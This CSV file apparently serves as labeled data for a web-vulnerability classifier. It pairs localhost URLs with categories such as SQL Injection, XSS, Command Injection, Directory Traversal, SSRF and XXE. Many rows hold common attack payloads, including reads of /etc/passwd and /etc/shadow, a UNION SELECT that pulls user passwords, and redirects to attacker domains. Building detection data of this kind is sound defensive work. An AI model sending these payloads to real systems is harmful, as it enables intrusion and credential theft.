URL,Vulnerability Type
http://127.0.0.1:5000/report?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/review?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/profile?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/posts?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/settings?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/messages?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/search?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/report?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/messages?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/settings?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/search?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/invoice?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/messages?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/profile?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/upload?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/report?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/settings?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/upload?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/invoice?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/messages?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/cart?user=admin'--,SQL Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/checkout?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/report?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/profile?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/login?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/posts?id=1' OR '1'='1,SQL Injection
"http://127.0.0.1:5000/search?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/order?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/messages?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/checkout?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/product?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/comments?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/cart?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/profile?user=admin'--,SQL Injection
http://127.0.0.1:5000/upload?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/login?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/report?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/login?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/report?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/review?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/invoice?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/product?ticket_id=2002,Insecure Direct Object Reference
